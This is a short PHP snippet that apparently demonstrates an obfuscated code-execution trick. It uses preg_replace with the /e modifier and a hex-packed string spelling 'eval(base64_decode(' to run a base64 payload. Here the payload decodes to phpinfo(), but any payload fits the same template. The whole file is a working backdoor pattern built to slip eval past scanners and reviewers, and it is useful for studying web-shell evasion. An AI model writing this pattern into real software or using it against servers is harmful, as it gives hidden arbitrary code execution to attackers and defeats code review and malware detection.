<?php
    $subject='any_thing_you_can_write';
    $pattern="/^.*$/e";
    $payload='cGhwaW5mbygpOw==';
    //cGhwaW5mbygpOw==: "phpinfo();"
    $replacement=pack('H*', '406576616c286261736536345f6465636f646528')."\"$payload\"))";
    //406576616c286261736536345f6465636f646528: "eval(base64_decode(";
    preg_replace($pattern, $replacement , $subject);
?>